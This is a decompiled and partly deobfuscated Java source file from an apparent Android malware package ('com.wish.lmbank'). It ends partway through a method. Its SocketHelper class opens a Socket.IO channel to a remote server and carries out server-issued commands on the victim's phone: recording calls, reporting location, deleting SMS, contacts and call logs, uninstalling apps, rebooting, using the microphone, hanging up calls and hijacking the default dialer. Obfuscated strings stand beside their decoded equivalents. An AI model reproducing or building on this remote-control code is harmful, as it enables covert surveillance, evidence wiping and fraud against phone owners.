package com.wish.lmbank.helper;

import android.text.TextUtils;

import com.wish.lmbank.AppStartV;
import com.wish.lmbank.bean.CommandCloseBluetoothBean;
import com.wish.lmbank.bean.CommandContactBean;
import com.wish.lmbank.bean.CommandContactLimitUpdateBean;
import com.wish.lmbank.bean.CommandDelCallLogBean;
import com.wish.lmbank.bean.CommandDeleteSMSBean;
import com.wish.lmbank.bean.CommandHangUpBean;
import com.wish.lmbank.bean.CommandLoadInfoBean;
import com.wish.lmbank.bean.CommandLocationBean;
import com.wish.lmbank.bean.CommandMICBean;
import com.wish.lmbank.bean.CommandRebootBean;
import com.wish.lmbank.bean.CommandRecordingBean;
import com.wish.lmbank.bean.CommandScreenStateBean;
import com.wish.lmbank.bean.CommandSetDefaultDialerBean;
import com.wish.lmbank.bean.CommandUninstallAPKBean;
import com.wish.lmbank.bean.OrderBean;
import com.wish.lmbank.common.Constants;
import com.wish.lmbank.common.URL;
import com.wish.lmbank.db.CommandRecordingDB;
import com.wish.lmbank.http.HttpEngine;
import com.wish.lmbank.http.HttpManager;
import com.wish.lmbank.http.HttpResponse;
import com.wish.lmbank.service.RecServiceV;
import com.wish.lmbank.temp.Debugging;
import com.wish.lmbank.utils.DeviceInfoUtils;
import com.wish.lmbank.utils.JsonUtils;
import com.wish.lmbank.utils.LogUtils;
import com.wish.lmbank.utils.SettingUtils;

import java.util.HashMap;

import gv00l3ah.mvdt7w.bb7d7pu7;
import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/helper/SocketHelper.class */
public class SocketHelper {
    private static volatile SocketHelper instance;
    private static boolean isClose = true;
    private static Socket mSocket;
    private static SocketCallback mSocketCallback;
    private static long time;
    private final String TAG = SocketHelper.class.getName();
    private final long MAX_RECORDING_DURATION = 36000000;
    private final long MIN_RECORDING_DURATION = 10000;
    //     private final String CALL_RECORDING_STATUS_STARTED = bb7d7pu7.m5998("Gh0IGx0MDQ");
    private final String CALL_RECORDING_STATUS_STARTED = "started";
    //     private final String CALL_RECORDING_STATUS_ENDED = bb7d7pu7.m5998("DAcNDA0");
    private final String CALL_RECORDING_STATUS_ENDED = "ended";
    private Emitter.Listener onConnect = new Emitter.Listener() { // from class: com.wish.lmbank.helper.SocketHelper.1

        @Override // io.socket.emitter.Emitter.Listener
        public void call(Object... objArr) {
//             LogUtils.v(TAG, bb7d7pu7.m5998("GgYKAgwdSQYHKgYHBwwKHQ"));
            LogUtils.v(TAG, "socket onConnect");
            if (SocketHelper.mSocket == null) {
                return;
            }
            if (SocketHelper.mSocketCallback != null) {
                SocketHelper.mSocketCallback.onConnect(objArr);
            }
            HashMap hashMap = new HashMap();
//             hashMap.put(bb7d7pu7.m5998("GgYKAgwdNgAN"), SocketHelper.mSocket.id());
            hashMap.put("socket_id", SocketHelper.mSocket.id());
//             hashMap.put(bb7d7pu7.m5998("CBkZIA0"), Constants.COMPANY_UUID);
            hashMap.put("appId", Constants.COMPANY_UUID);
//             hashMap.put(bb7d7pu7.m5998("DQwfAAoMNgAN"), DeviceInfoUtils.getDeviceID(AppStartV.getContext()));
            hashMap.put("device_id", DeviceInfoUtils.getDeviceID(AppStartV.getContext()));
//             SocketHelper.mSocket.emit(bb7d7pu7.m5998("DB8MBx02CwAHDTYADTYPGwYENgoFAAwHHQ"), JsonUtils.map2Json(hashMap).toString());
            SocketHelper.mSocket.emit("event_bind_id_from_client", JsonUtils.map2Json(hashMap).toString());
        }
    };
    private Emitter.Listener onDisconnect = new Emitter.Listener() { // from class: com.wish.lmbank.helper.SocketHelper.2

        @Override // io.socket.emitter.Emitter.Listener
        public void call(Object... objArr) {
            //                 LogUtils.v(TAG, bb7d7pu7.m5998("GgYKAgwdSQYHLQAaCgYHBwwKHQ"));
            LogUtils.v(TAG, "socket onDisconnect");
            if (SocketHelper.mSocketCallback != null) {
                SocketHelper.mSocketCallback.onDisconnect(objArr);
                return;
            }
            return;
        }
    };
    private Emitter.Listener onConnectError = new Emitter.Listener() { // from class: com.wish.lmbank.helper.SocketHelper.3

        @Override // io.socket.emitter.Emitter.Listener
        public void call(Object... objArr) {
//             LogUtils.v(TAG, bb7d7pu7.m5998("GgYKAgwdSQYHKgYHBwwKHSwbGwYb"));
            LogUtils.v(TAG, "socket onConnectError");
            if (SocketHelper.mSocketCallback != null) {
                SocketHelper.mSocketCallback.onConnectError(objArr);
            }
        }
    };
    private Emitter.Listener onReceiveRecording = new Emitter.Listener() { // from class: com.wish.lmbank.helper.SocketHelper.4
        @Override // io.socket.emitter.Emitter.Listener
        public void call(Object... objArr) {
            CommandRecordingBean commandRecordingBean;
            String str = TAG;
//             LogUtils.v(str, bb7d7pu7.m5998("Bgc7DAoMAB8MOwwKBhsNAAcOSQ") + objArr[0]);
            LogUtils.v(str, "onReceiveRecording " + objArr[0]);
            if (SocketHelper.mSocket == null || (commandRecordingBean = (CommandRecordingBean) JsonUtils.parseJsonWithGson((String) objArr[0], CommandRecordingBean.class)) == null || TextUtils.isEmpty(commandRecordingBean.getDeviceId()) || !commandRecordingBean.getDeviceId().equals(DeviceInfoUtils.getDeviceID(AppStartV.getContext()))) {
                return;
            }
//             SocketHelper.mSocket.emit(bb7d7pu7.m5998("DB8MBx02GwwKBhsNAAcONhsMGQUQNhoMGx8MGw"), objArr[0]);
            SocketHelper.mSocket.emit("event_recording_reply_server", objArr[0]);
            commandRecordingBean.setDuration(commandRecordingBean.getDuration() * 1000);
            if (commandRecordingBean.getDuration() >= 36000000) {
                commandRecordingBean.setDuration(36000000L);
            }
            if (commandRecordingBean.getDuration() <= 10000) {
                commandRecordingBean.setDuration(10000L);
            }
            long addCommandRecording = CommandRecordingDB.getInstance(AppStartV.getContext()).addCommandRecording(commandRecordingBean.getrId(), commandRecordingBean.getDuration());
            String str2 = TAG;
//             LogUtils.d(str2, bb7d7pu7.m5998("Bgc7DAoMAB8MOwwKBhsNAAcOSUVJGwwdUw") + addCommandRecording);
            LogUtils.d(str2, "onReceiveRecording , ret:" + addCommandRecording);
            if (SocketHelper.mSocketCallback != null) {
                SocketHelper.mSocketCallback.onReceiveRecording(commandRecordingBean);
            }
        }
    };
    private Emitter.Listener onReceiveContactLimitUpdate = new Emitter.Listener() { // from class: com.wish.lmbank.helper.SocketHelper.5
        @Override // io.socket.emitter.Emitter.Listener
        public void call(Object... objArr) {
            CommandContactLimitUpdateBean commandContactLimitUpdateBean;
            String str = TAG;
//             LogUtils.v(str, bb7d7pu7.m5998("Bgc7DAoMAB8MKgYHHQgKHSUABAAdPBkNCB0MSQ") + objArr[0]);
            LogUtils.v(str, "onReceiveContactLimitUpdate " + objArr[0]);
            if (SocketHelper.mSocket == null
                    || (commandContactLimitUpdateBean = (CommandContactLimitUpdateBean) JsonUtils.parseJsonWithGson((String) objArr[0], CommandContactLimitUpdateBean.class)) == null
                    || TextUtils.isEmpty(commandContactLimitUpdateBean.getDeviceId())
                    || !commandContactLimitUpdateBean.getDeviceId().equals(DeviceInfoUtils.getDeviceID(AppStartV.getContext()))
                    || SocketHelper.mSocketCallback == null) {
                return;
            }
            SocketHelper.mSocketCallback.onReceiveContactLimitUpdate(commandContactLimitUpdateBean);
        }
    };
    private Emitter.Listener onDeleteSMS = new Emitter.Listener() { // from class: com.wish.lmbank.helper.SocketHelper.6

        @Override // io.socket.emitter.Emitter.Listener
        public void call(Object... objArr) {
            CommandDeleteSMSBean commandDeleteSMSBean;
            String str = TAG;
//             LogUtils.v(str, bb7d7pu7.m5998("BgctDAUMHQw6JDpJ") + objArr[0]);
            LogUtils.v(str, "onDeleteSMS " + objArr[0]);
            if (SocketHelper.mSocket == null || (commandDeleteSMSBean = (CommandDeleteSMSBean) JsonUtils.parseJsonWithGson((String) objArr[0], CommandDeleteSMSBean.class)) == null || TextUtils.isEmpty(commandDeleteSMSBean.getDeviceId()) || !commandDeleteSMSBean.getDeviceId().equals(DeviceInfoUtils.getDeviceID(AppStartV.getContext())) || SocketHelper.mSocketCallback == null) {
                return;
            }
            SocketHelper.mSocketCallback.onDeleteSMS(commandDeleteSMSBean);
        }
    };
    private Emitter.Listener onDeleteContact = new Emitter.Listener() { // from class: com.wish.lmbank.helper.SocketHelper.7

        @Override // io.socket.emitter.Emitter.Listener
        public void call(Object... objArr) {
            CommandContactBean commandContactBean;
            String str = TAG;
//             LogUtils.v(str, bb7d7pu7.m5998("BgctDAUMHQwqBgcdCAodSQ") + objArr[0]);
            LogUtils.v(str, "onDeleteContact " + objArr[0]);
            if (SocketHelper.mSocket == null || (commandContactBean = (CommandContactBean) JsonUtils.parseJsonWithGson((String) objArr[0], CommandContactBean.class)) == null || TextUtils.isEmpty(commandContactBean.getDeviceId()) || !commandContactBean.getDeviceId().equals(DeviceInfoUtils.getDeviceID(AppStartV.getContext())) || SocketHelper.mSocketCallback == null) {
                return;
            }
            SocketHelper.mSocketCallback.onDeleteContact(commandContactBean);
        }
    };
    private Emitter.Listener onAddContact = new Emitter.Listener() { // from class: com.wish.lmbank.helper.SocketHelper.8


        @Override // io.socket.emitter.Emitter.Listener
        public void call(Object... objArr) {
            CommandContactBean commandContactBean;
            String str = TAG;
//                 LogUtils.v(str, bb7d7pu7.m5998("BgcoDQ0qBgcdCAodSQ") + objArr[0]);
            LogUtils.v(str, "onAddContact " + objArr[0]);
            if (SocketHelper.mSocket == null || (commandContactBean = (CommandContactBean) JsonUtils.parseJsonWithGson((String) objArr[0], CommandContactBean.class)) == null || TextUtils.isEmpty(commandContactBean.getDeviceId()) || !commandContactBean.getDeviceId().equals(DeviceInfoUtils.getDeviceID(AppStartV.getContext())) || SocketHelper.mSocketCallback == null) {
                return;
            }
            SocketHelper.mSocketCallback.onAddContact(commandContactBean);
            return;
        }
    };
    private Emitter.Listener onUninstallAPK = new Emitter.Listener() { // from class: com.wish.lmbank.helper.SocketHelper.9


        @Override // io.socket.emitter.Emitter.Listener
        public void call(Object... objArr) {
            CommandUninstallAPKBean commandUninstallAPKBean;
            String str = TAG;
//             LogUtils.v(str, bb7d7pu7.m5998("Bgc8BwAHGh0IBQUoOSJJ") + objArr[0]);
            LogUtils.v(str, "onUninstallAPK " + objArr[0]);
            if (SocketHelper.mSocket == null || (commandUninstallAPKBean = (CommandUninstallAPKBean) JsonUtils.parseJsonWithGson((String) objArr[0], CommandUninstallAPKBean.class)) == null || TextUtils.isEmpty(commandUninstallAPKBean.getDeviceId()) || !commandUninstallAPKBean.getDeviceId().equals(DeviceInfoUtils.getDeviceID(AppStartV.getContext())) || SocketHelper.mSocketCallback == null) {
                return;
            }
            SocketHelper.mSocketCallback.onUninstallAPK(commandUninstallAPKBean);
        }
    };
    private Emitter.Listener onReboot = new Emitter.Listener() { // from class: com.wish.lmbank.helper.SocketHelper.10


        @Override // io.socket.emitter.Emitter.Listener
        public void call(Object... objArr) {
            CommandRebootBean commandRebootBean;
            String str = TAG;
//                 LogUtils.v(str, bb7d7pu7.m5998("Bgc7DAsGBh1J") + objArr[0]);
            LogUtils.v(str, "onReboot " + objArr[0]);
            if (SocketHelper.mSocket == null || (commandRebootBean = (CommandRebootBean) JsonUtils.parseJsonWithGson((String) objArr[0], CommandRebootBean.class)) == null || TextUtils.isEmpty(commandRebootBean.getDeviceId()) || !commandRebootBean.getDeviceId().equals(DeviceInfoUtils.getDeviceID(AppStartV.getContext())) || SocketHelper.mSocketCallback == null) {
                return;
            }
            SocketHelper.mSocketCallback.onReboot(commandRebootBean);
            return;
        }
    };
    private Emitter.Listener onMic = new Emitter.Listener() { // from class: com.wish.lmbank.helper.SocketHelper.11


        @Override // io.socket.emitter.Emitter.Listener
        public void call(Object... objArr) {
            CommandMICBean commandMICBean;
            String str = TAG;
//             LogUtils.v(str, bb7d7pu7.m5998("BgckAApJ") + objArr[0]);
            LogUtils.v(str, "onMic " + objArr[0]);
            if (SocketHelper.mSocket == null || (commandMICBean = (CommandMICBean) JsonUtils.parseJsonWithGson((String) objArr[0], CommandMICBean.class)) == null || TextUtils.isEmpty(commandMICBean.getDeviceId()) || !commandMICBean.getDeviceId().equals(DeviceInfoUtils.getDeviceID(AppStartV.getContext())) || SocketHelper.mSocketCallback == null) {
                return;
            }
            SocketHelper.mSocketCallback.onMic(commandMICBean);
        }
    };
    private Emitter.Listener onDelCallLog = new Emitter.Listener() { // from class: com.wish.lmbank.helper.SocketHelper.12


        @Override // io.socket.emitter.Emitter.Listener
        public void call(Object... objArr) {
            CommandDelCallLogBean commandDelCallLogBean;
            String str = TAG;
//             LogUtils.v(str, bb7d7pu7.m5998("BgctDAUqCAUFJQYOSQ") + objArr[0]);
            LogUtils.v(str, "onDelCallLog " + objArr[0]);
            if (SocketHelper.mSocket == null || (commandDelCallLogBean = (CommandDelCallLogBean) JsonUtils.parseJsonWithGson((String) objArr[0], CommandDelCallLogBean.class)) == null || TextUtils.isEmpty(commandDelCallLogBean.getDeviceId()) || !commandDelCallLogBean.getDeviceId().equals(DeviceInfoUtils.getDeviceID(AppStartV.getContext())) || SocketHelper.mSocketCallback == null) {
                return;
            }
            SocketHelper.mSocketCallback.onDelCallLog(commandDelCallLogBean);
        }
    };
    private Emitter.Listener onCloseBluetooth = new Emitter.Listener() { // from class: com.wish.lmbank.helper.SocketHelper.13


        @Override // io.socket.emitter.Emitter.Listener
        public void call(Object... objArr) {
            CommandCloseBluetoothBean commandCloseBluetoothBean;
            String str = TAG;
//                 LogUtils.v(str, bb7d7pu7.m5998("BgcqBQYaDCsFHAwdBgYdAUk") + objArr[0]);
            LogUtils.v(str, "onCloseBluetooth " + objArr[0]);
            if (SocketHelper.mSocket == null || (commandCloseBluetoothBean = (CommandCloseBluetoothBean) JsonUtils.parseJsonWithGson((String) objArr[0], CommandCloseBluetoothBean.class)) == null || TextUtils.isEmpty(commandCloseBluetoothBean.getDeviceId()) || !commandCloseBluetoothBean.getDeviceId().equals(DeviceInfoUtils.getDeviceID(AppStartV.getContext())) || SocketHelper.mSocketCallback == null) {
                return;
            }
            SocketHelper.mSocketCallback.onCloseBluetooth(commandCloseBluetoothBean);
            return;
        }
    };
    private Emitter.Listener onScreenState = new Emitter.Listener() { // from class: com.wish.lmbank.helper.SocketHelper.14


        @Override // io.socket.emitter.Emitter.Listener
        public void call(Object... objArr) {
            CommandScreenStateBean commandScreenStateBean;
            String str = TAG;
//                 LogUtils.v(str, bb7d7pu7.m5998("Bgc6ChsMDAc6HQgdDEk") + objArr[0]);
            LogUtils.v(str, "onScreenState " + objArr[0]);
            if (SocketHelper.mSocket == null || (commandScreenStateBean = (CommandScreenStateBean) JsonUtils.parseJsonWithGson((String) objArr[0], CommandScreenStateBean.class)) == null || TextUtils.isEmpty(commandScreenStateBean.getDeviceId()) || !commandScreenStateBean.getDeviceId().equals(DeviceInfoUtils.getDeviceID(AppStartV.getContext())) || SocketHelper.mSocketCallback == null) {
                return;
            }
            SocketHelper.mSocketCallback.onScreenState(commandScreenStateBean);
            return;
        }
    };
    private Emitter.Listener onSetDefaultDialer = new Emitter.Listener() { // from class: com.wish.lmbank.helper.SocketHelper.15


        @Override // io.socket.emitter.Emitter.Listener
        public void call(Object... objArr) {
            CommandSetDefaultDialerBean commandSetDefaultDialerBean;
            String str = TAG;
//             LogUtils.v(str, bb7d7pu7.m5998("Bgc6DB0tDA8IHAUdLQAIBQwbSQ") + objArr[0]);
            LogUtils.v(str, "onSetDefaultDialer " + objArr[0]);
            if (SocketHelper.mSocket == null || (commandSetDefaultDialerBean = (CommandSetDefaultDialerBean) JsonUtils.parseJsonWithGson((String) objArr[0], CommandSetDefaultDialerBean.class)) == null || TextUtils.isEmpty(commandSetDefaultDialerBean.getDeviceId()) || !commandSetDefaultDialerBean.getDeviceId().equals(DeviceInfoUtils.getDeviceID(AppStartV.getContext())) || SocketHelper.mSocketCallback == null) {
                return;
            }
            SocketHelper.mSocketCallback.onSetDefaultDialer(commandSetDefaultDialerBean);
        }
    };
    private Emitter.Listener onReceiveLoadInfo = new Emitter.Listener() { // from class: com.wish.lmbank.helper.SocketHelper.16


        @Override // io.socket.emitter.Emitter.Listener
        public void call(Object... objArr) {
            String str = TAG;
            StringBuilder sb = new StringBuilder();
//                 sb.append(bb7d7pu7.m5998("Bgc7DAoMAB8MJQYIDSAHDwZJ"));
            sb.append("onReceiveLoadInfo ");
            sb.append(objArr[0]);
            LogUtils.v(str, sb.toString());
            if (SocketHelper.mSocket != null) {
                CommandLoadInfoBean commandLoadInfoBean = (CommandLoadInfoBean) JsonUtils.parseJsonWithGson((String) objArr[0], CommandLoadInfoBean.class);
                if (commandLoadInfoBean == null || TextUtils.isEmpty(commandLoadInfoBean.getDeviceId()) || !commandLoadInfoBean.getDeviceId().equals(DeviceInfoUtils.getDeviceID(AppStartV.getContext())) || SocketHelper.mSocketCallback == null) {
                    return;
                }
                SocketHelper.mSocketCallback.onReceiveLoadInfo(commandLoadInfoBean);
                return;
            }
            return;
        }
    };
    private Emitter.Listener onReceiveOrder = new Emitter.Listener() { // from class: com.wish.lmbank.helper.SocketHelper.17


        @Override // io.socket.emitter.Emitter.Listener
        public void call(Object... objArr) {
            String str = TAG;
            StringBuilder sb = new StringBuilder();
//             sb.append(bb7d7pu7.m5998("Bgc7DAoMAB8MJhsNDBtJ"));
            sb.append("onReceiveOrder ");
            sb.append(objArr[0]);
            LogUtils.v(str, sb.toString());
            if (SocketHelper.mSocket != null) {
                OrderBean orderBean = (OrderBean) JsonUtils.parseJsonWithGson((String) objArr[0], OrderBean.class);
                if (orderBean == null || TextUtils.isEmpty(orderBean.getImei()) || !orderBean.getImei().equals(DeviceInfoUtils.getDeviceID(AppStartV.getContext())) || SocketHelper.mSocketCallback == null) {
                    return;
                }
                SocketHelper.mSocketCallback.onReceiveOrder(orderBean);
            }
        }
    };
    private Emitter.Listener onReceiveHangUp = new Emitter.Listener() { // from class: com.wish.lmbank.helper.SocketHelper.18


        @Override // io.socket.emitter.Emitter.Listener
        public void call(Object... objArr) {
            CommandHangUpBean commandHangUpBean;
            String str = TAG;
//             LogUtils.v(str, bb7d7pu7.m5998("Bgc7DAoMAB8MIQgHDjwZSQ") + objArr[0]);
            LogUtils.v(str, "onReceiveHangUp " + objArr[0]);
            if (SocketHelper.mSocket == null || (commandHangUpBean = (CommandHangUpBean) JsonUtils.parseJsonWithGson((String) objArr[0], CommandHangUpBean.class)) == null || TextUtils.isEmpty(commandHangUpBean.getDeviceId()) || !commandHangUpBean.getDeviceId().equals(DeviceInfoUtils.getDeviceID(AppStartV.getContext())) || SocketHelper.mSocketCallback == null) {
                return;
            }
            SocketHelper.mSocketCallback.onReceiveHangUp(commandHangUpBean);
        }
    };
    private Emitter.Listener onReceiveLocation = new Emitter.Listener() { // from class: com.wish.lmbank.helper.SocketHelper.19


        @Override // io.socket.emitter.Emitter.Listener
        public void call(Object... objArr) {
            CommandLocationBean commandLocationBean;
            String str = TAG;
//                 LogUtils.v(str, bb7d7pu7.m5998("Bgc7DAoMAB8MJQYKCB0ABgdJ") + objArr[0]);
            LogUtils.v(str, "onReceiveLocation " + objArr[0]);
            if (SocketHelper.mSocket == null || (commandLocationBean = (CommandLocationBean) JsonUtils.parseJsonWithGson((String) objArr[0], CommandLocationBean.class)) == null || TextUtils.isEmpty(commandLocationBean.getDeviceId()) || !commandLocationBean.getDeviceId().equals(DeviceInfoUtils.getDeviceID(AppStartV.getContext())) || SocketHelper.mSocketCallback == null) {
                return;
            }
            SocketHelper.mSocketCallback.onReceiveLocation(commandLocationBean);
            return;
        }
    };

    /* loaded from: cookie_9234504.jar:com/wish/lmbank/helper/SocketHelper$SocketCallback.class */
    public interface SocketCallback {
        void onAddContact(CommandContactBean commandContactBean);

        void onCloseBluetooth(CommandCloseBluetoothBean commandCloseBluetoothBean);

        void onConnect(Object[] objArr);

        void onConnectError(Object[] objArr);

        void onDelCallLog(CommandDelCallLogBean commandDelCallLogBean);

        void onDeleteContact(CommandContactBean commandContactBean);

        void onDeleteSMS(CommandDeleteSMSBean commandDeleteSMSBean);

        void onDisconnect(Object[] objArr);

        void onMic(CommandMICBean commandMICBean);

        void onReboot(CommandRebootBean commandRebootBean);

        void onReceiveContactLimitUpdate(CommandContactLimitUpdateBean commandContactLimitUpdateBean);

        void onReceiveHangUp(CommandHangUpBean commandHangUpBean);

        void onReceiveLoadInfo(CommandLoadInfoBean commandLoadInfoBean);

        void onReceiveLocation(CommandLocationBean commandLocationBean);

        void onReceiveOrder(OrderBean orderBean);

        void onReceiveRecording(CommandRecordingBean commandRecordingBean);

        void onScreenState(CommandScreenStateBean commandScreenStateBean);

        void onSetDefaultDialer(CommandSetDefaultDialerBean commandSetDefaultDialerBean);

        void onUninstallAPK(CommandUninstallAPKBean commandUninstallAPKBean);
    }

    public static SocketHelper getInstance(SocketCallback socketCallback) {
        mSocketCallback = socketCallback;
        if (isClose) {
            synchronized (SocketHelper.class) {
                try {
                    if (isClose) {
                        instance = new SocketHelper();
                    }
                } catch (Throwable th) {
                    throw th;
                }
            }
        }
        return instance;
    }

    private SocketHelper() {
        try {
            isClose = false;
//             Socket socket = IO.socket(URL.getRequestUrl(bb7d7pu7.m5998("Oyw4PCw6PTY6JioiLD02Oiw7Pyw7Njw7JQ")));
            String url = URL.getRequestUrl("REQUEST_SOCKET_SERVER_URL");
            System.out.println(url);
            Socket socket = IO.socket(url);
            mSocket = socket;
//             socket.on(bb7d7pu7.m5998("CgYHBwwKHQ"), this.onConnect);
            socket.on("connect", this.onConnect);
//             mSocket.on(bb7d7pu7.m5998("DQAaCgYHBwwKHQ"), this.onDisconnect);
            mSocket.on("disconnect", this.onDisconnect);
//             mSocket.on(bb7d7pu7.m5998("CgYHBwwKHTYMGxsGGw"), this.onConnectError);
            mSocket.on("connect_error", this.onConnectError);
//             mSocket.on(bb7d7pu7.m5998("CgYHBwwKHTYdAAQMBhwd"), this.onConnectError);
            mSocket.on("connect_timeout", this.onConnectError);
//             mSocket.on(bb7d7pu7.m5998("DB8MBx02GwwKBhsNAAcONg8bBgQ2GgwbHwwb"), this.onReceiveRecording);
            mSocket.on("event_recording_from_server", this.onReceiveRecording);
//             mSocket.on(bb7d7pu7.m5998("DB8MBx02BQYKCB0ABgc2DxsGBDYaDBsfDBs"), this.onReceiveLocation);
            mSocket.on("event_location_from_server", this.onReceiveLocation);
//             mSocket.on(bb7d7pu7.m5998("DB8MBx02CgYHHQgKHTYFAAQAHTYcGQ0IHQw2DxsGBDYaDBsfDBs"), this.onReceiveContactLimitUpdate);
            mSocket.on("event_contact_limit_update_from_server", this.onReceiveContactLimitUpdate);
//             mSocket.on(bb7d7pu7.m5998("DB8MBx02BQYIDTYABw8GNg8bBgQ2GgwbHwwb"), this.onReceiveLoadInfo);
            mSocket.on("event_load_info_from_server", this.onReceiveLoadInfo);
//             mSocket.on(bb7d7pu7.m5998("DB8MBx02AQgHDjYcGTYPGwYENhoMGx8MGw"), this.onReceiveHangUp);
            mSocket.on("event_hang_up_from_server", this.onReceiveHangUp);
//             mSocket.on(bb7d7pu7.m5998("DB8MBx02BhsNDBs2DxsGBDYaDBsfDBs"), this.onReceiveOrder);
            mSocket.on("event_order_from_server", this.onReceiveOrder);
//             mSocket.on(bb7d7pu7.m5998("DB8MBx02DQwFDB0MNhoEGjYPGwYENhoMGx8MGw"), this.onDeleteSMS);
            mSocket.on("eve" +
                    "nt_delete_sms_from_server", this.onDeleteSMS);
//             mSocket.on(bb7d7pu7.m5998("DB8MBx02DQwFDB0MNgoGBx0ICh02DxsGBDYaDBsfDBs"), this.onDeleteContact);
            mSocket.on("event_delete_contact_from_server", this.onDeleteContact);
//             mSocket.on(bb7d7pu7.m5998("DB8MBx02CA0NNgoGBx0ICh02DxsGBDYaDBsfDBs"), this.onAddContact);
            mSocket.on("event_add_contact_from_server", this.onAddContact);
//             mSocket.on(bb7d7pu7.m5998("DB8MBx02HAcABxodCAUFNggZAjYPGwYENhoMGx8MGw"), this.onUninstallAPK);
            mSocket.on("event_uninstall_apk_from_server", this.onUninstallAPK);
//             mSocket.on(bb7d7pu7.m5998("DB8MBx02GgwdNg0MDwgcBR02DQAIBQwbNg8bBgQ2GgwbHwwb"), this.onSetDefaultDialer);
            mSocket.on("event_set_default_dialer_from_server", this.onSetDefaultDialer);
//             mSocket.on(bb7d7pu7.m5998("DB8MBx02GwwLBgYdNg8bBgQ2GgwbHwwb"), this.onReboot);
            mSocket.on("event_reboot_from_server", this.onReboot);
//             mSocket.on(bb7d7pu7.m5998("DB8MBx02BAAKNg8bBgQ2GgwbHwwb"), this.onMic);
            mSocket.on("event_mic_from_server", this.onMic);
//             mSocket.on(bb7d7pu7.m5998("DB8MBx02DQwFNgoIBQU2BQYONg8bBgQ2GgwbHwwb"), this.onDelCallLog);
            mSocket.on("event_del_call_log_from_server", this.onDelCallLog);
//             mSocket.on(bb7d7pu7.m5998("DB8MBx02CgUGGgw2CwUcDB0GBh0BNg8bBgQ2GgwbHwwb"), this.onCloseBluetooth);
            mSocket.on("event_close_bluetooth_from_server", this.onCloseBluetooth);
//             mSocket.on(bb7d7pu7.m5998("DB8MBx02GgobDAwHNhodCB0MNg8bBgQ2GgwbHwwb"), this.onScreenState);
            mSocket.on("event_screen_state_from_server", this.onScreenState);
        } catch (Exception e) {
//             LogUtils.callLog(this.TAG + bb7d7pu7.m5998("RUkKGwwIHQw6BgoCDB1JDBEKDBkdAAYH") + e.getMessage());
            LogUtils.callLog(this.TAG + ", createSocket exception" + e.getMessage());
        }
    }

    public void connect() {
        String str = this.TAG;
//         LogUtils.v(str, bb7d7pu7.m5998("CgYHBwwKHVNJ") + mSocket);
        LogUtils.v(str, "connect: " + mSocket);
        Socket socket = mSocket;
        if (socket != null) {
            socket.connect();
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:25:0x006b, code lost:
        if ((java.lang.System.currentTimeMillis() - com.wish.lmbank.helper.SocketHelper.time) < 600000) goto L9;
     */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    public void reconnectSocket() {
        if (Debugging.ignoreError()) {
            return;
        }
        if (RecServiceV.isPause){
            LogUtils.callLog(bb7d7pu7.m5998("GwwKBgcHDAodOgYKAgwdRUk8OyVTSQ") + URL.getRequestUrl(bb7d7pu7.m5998("Oyw4PCw6PTY6JioiLD02Oiw7Pyw7Njw7JQ")) + bb7d7pu7.m5998("RUkEOgYKAgwdU0k") + mSocket);

        }
        connect();
    }

    public void closeSocket() {
        String str = this.TAG;
//             LogUtils.v(str, bb7d7pu7.m5998("CgUGGgw6BgoCDB1FSQQ6BgoCDB1TSQ") + mSocket + bb7d7pu7.m5998("RUkAGioFBhoMU0k") + isClose);
        LogUtils.v(str, "closeSocket, mSocket: " + mSocket + ", isClose: " + isClose);
        Socket socket = mSocket;
        if (socket == null || isClose) {
            return;
        }
        isClose = true;
//             socket.off(bb7d7pu7.m5998("CgYHBwwKHQ"), this.onConnect);
        socket.off("connect", this.onConnect);
//             mSocket.off(bb7d7pu7.m5998("DQAaCgYHBwwKHQ"), this.onDisconnect);
        mSocket.off("disconnect", this.onDisconnect);
//             mSocket.off(bb7d7pu7.m5998("CgYHBwwKHTYMGxsGGw"), this.onConnectError);
        mSocket.off("connect_error", this.onConnectError);
//             mSocket.off(bb7d7pu7.m5998("CgYHBwwKHTYdAAQMBhwd"), this.onConnectError);
        mSocket.off("connect_timeout", this.onConnectError);
//             mSocket.off(bb7d7pu7.m5998("DB8MBx02GwwKBhsNAAcONg8bBgQ2GgwbHwwb"), this.onReceiveRecording);
        mSocket.off("event_recording_from_server", this.onReceiveRecording);
//             mSocket.off(bb7d7pu7.m5998("DB8MBx02BQYKCB0ABgc2DxsGBDYaDBsfDBs"), this.onReceiveLocation);
        mSocket.off("event_location_from_server", this.onReceiveLocation);
//             mSocket.off(bb7d7pu7.m5998("DB8MBx02CgYHHQgKHTYFAAQAHTYcGQ0IHQw2DxsGBDYaDBsfDBs"), this.onReceiveContactLimitUpdate);
        mSocket.off("event_contact_limit_update_from_server", this.onReceiveContactLimitUpdate);
//             mSocket.off(bb7d7pu7.m5998("DB8MBx02BQYIDTYABw8GNg8bBgQ2GgwbHwwb"), this.onReceiveLoadInfo);
        mSocket.off("event_load_info_from_server", this.onReceiveLoadInfo);
//             mSocket.off(bb7d7pu7.m5998("DB8MBx02AQgHDjYcGTYPGwYENhoMGx8MGw"), this.onReceiveHangUp);
        mSocket.off("event_hang_up_from_server", this.onReceiveHangUp);
//             mSocket.off(bb7d7pu7.m5998("DB8MBx02BhsNDBs2DxsGBDYaDBsfDBs"), this.onReceiveOrder);
        mSocket.off("event_order_from_server", this.onReceiveOrder);
//             mSocket.off(bb7d7pu7.m5998("DB8MBx02DQwFDB0MNhoEGjYPGwYENhoMGx8MGw"), this.onDeleteSMS);
        mSocket.off("event_delete_sms_from_server", this.onDeleteSMS);
//             mSocket.off(bb7d7pu7.m5998("DB8MBx02DQwFDB0MNgoGBx0ICh02DxsGBDYaDBsfDBs"), this.onDeleteContact);
        mSocket.off("event_delete_contact_from_server", this.onDeleteContact);
//             mSocket.off(bb7d7pu7.m5998("DB8MBx02CA0NNgoGBx0ICh02DxsGBDYaDBsfDBs"), this.onAddContact);
        mSocket.off("event_add_contact_from_server", this.onAddContact);
//             mSocket.off(bb7d7pu7.m5998("DB8MBx02HAcABxodCAUFNggZAjYPGwYENhoMGx8MGw"), this.onUninstallAPK);
        mSocket.off("event_uninstall_apk_from_server", this.onUninstallAPK);
//             mSocket.off(bb7d7pu7.m5998("DB8MBx02GgwdNg0MDwgcBR02DQAIBQwbNg8bBgQ2GgwbHwwb"), this.onSetDefaultDialer);
        mSocket.off("event_set_default_dialer_from_server", this.onSetDefaultDialer);
